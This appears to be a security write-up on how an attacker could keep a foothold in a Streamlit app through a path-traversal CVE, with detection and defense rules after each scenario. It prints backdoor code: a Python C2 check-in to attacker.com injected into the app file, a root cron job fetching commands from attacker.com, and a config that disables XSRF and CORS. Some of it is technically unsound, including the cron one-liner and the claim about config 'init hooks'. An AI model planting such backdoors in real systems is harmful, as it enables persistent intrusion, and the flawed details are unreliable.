# Streamlit Persistence Scenarios — CHAIN 6

Based on CVE-2024-42468 (path traversal → file write) exploitation, three persistence techniques documented for environments where file system write access is achieved.

## Scenario A: Config Backdoor via .streamlit/config.toml

**Access level required:** File write via traversal + application restart

**Attack flow:**
1. CVE-2024-42468 traversal confirms writable `/app/.streamlit/` directory
2. Write backdoor config to `.streamlit/config.toml`:

```toml
[client]
headless = false
runOnSave = true

[logger]
level = "debug"

[server]
# Backdoor: execute arbitrary code on every app load
runOnSave = true
maxUploadSize = 200
enableXsrfProtection = false
enableCORS = false

# Persistence: call external C2 on startup
# (executed via custom module import)
```

3. On next Streamlit restart, the malicious config loads
4. Attack: Streamlit runs pre-configured init hooks that connect to C2

**Detection:**
- Monitor `.streamlit/config.toml` for unexpected keys (enableXsrfProtection=false is immediate tell)
- Alert on `runOnSave=true` in production configs
- Log any file modifications to `.streamlit/` directory

**Defense rule:**
```
File integrity monitoring on .streamlit/config.toml
Alert: Any modification outside of deployment pipeline
Expected: Stable hash across restarts
```

---

## Scenario B: Application Backdoor via streamlit_app.py Injection

**Access level required:** File write to application directory

**Attack flow:**
1. CVE-2024-42468 traversal → read `/app/streamlit_app.py`
2. Traverse to write to app file (if world-writable or attacker-owned process can write)
3. Append C2 callback at start of file:

```python
# Injected at line 1 of streamlit_app.py
import requests
import threading

def c2_callback():
    try:
        requests.post("http://attacker.com/checkin", json={"host": "streamlit", "ip": "target_ip"}, timeout=5)
    except:
        pass

threading.Thread(target=c2_callback, daemon=True).start()

# [rest of original app follows...]
```

4. Every time the app runs, C2 callback fires
5. Attacker receives checkin → can inject commands via WebSocket

**Detection:**
- Diff `streamlit_app.py` against source control on every restart
- Alert on unexpected `import requests` or `threading` in app startup
- Monitor outbound HTTP/HTTPS from port 8501 Streamlit process

**Defense rule:**
```
Application integrity: hash streamlit_app.py on container start
Alert: any mismatch
Log: all outbound connections from Streamlit process
```

---

## Scenario C: Cron Job for Reverse Shell (if RCE achieved)

**Access level required:** RCE (command execution) via traversal + environment variable injection

**Attack flow:**
1. CVE-2024-42468 traversal → exfiltrate `/proc/self/environ`
2. Identify Python path and environment
3. Write cron job to `/etc/cron.d/streamlit-task`:

```bash
*/5 * * * * root cd /app && python3 -c 'import requests; requests.post("http://attacker.com/cmd", json={"host":"streamlit"}).text | exec'
```

4. Cron fires every 5 minutes
5. Attacker sends command via HTTP → executed on target

**Assumptions:**
- Container runs as root (common misconfiguration)
- Cron daemon is running
- Outbound HTTPS to attacker domain is allowed

**Detection:**
- Monitor `/etc/cron.d/` for unexpected jobs
- Alert on cron jobs containing network calls (requests, curl, nc, bash TCP)
- Log cron execution: `journalctl -u cron` or syslog

**Defense rule:**
```
Read-only cron directories: mount /etc/cron.d/ as read-only
Disable cron in container if not needed
Monitor cron logs for execution
Kill any cron job containing network primitives
```

---

## Summary: Persistence Difficulty Assessment

| Scenario | Difficulty | Detectability | Survival Likelihood |
|----------|-----------|----------------|-------------------|
| A. Config backdoor | Easy (text edit) | Medium (config changes logged) | High (survives app restarts) |
| B. App injection | Medium (requires source edit) | Low (blends with source) | High (executes every load) |
| C. Cron reverse shell | Medium (RCE required) | High (obvious cron entries) | Medium (killed by container restart) |

---

## Recommended Detection & Response

**Pre-emptive (Defense):**
1. Read-only mount critical dirs: `/etc/cron.d`, `/etc/init.d`, `/etc/systemd/system/`
2. File integrity monitoring on: `streamlit_app.py`, `.streamlit/config.toml`
3. Egress filtering: block all outbound except to known services
4. Process monitoring: alert on Python subprocess creation

**Detection (Incident Response):**
1. Hash check all critical files on container startup
2. Cron audit: `grep -r "requests\|curl\|bash" /etc/cron.d/`
3. Log analysis: search for `requests.post|urllib|socket` in app logs
4. Network: inspect outbound connections from port 8501

**Remediation:**
1. Restore application from clean source control commit
2. Rotate all exposed credentials
3. Kill container + redeploy from image
4. Audit all Streamlit instances for similar indicators
5. Enable container image scanning for backdoors

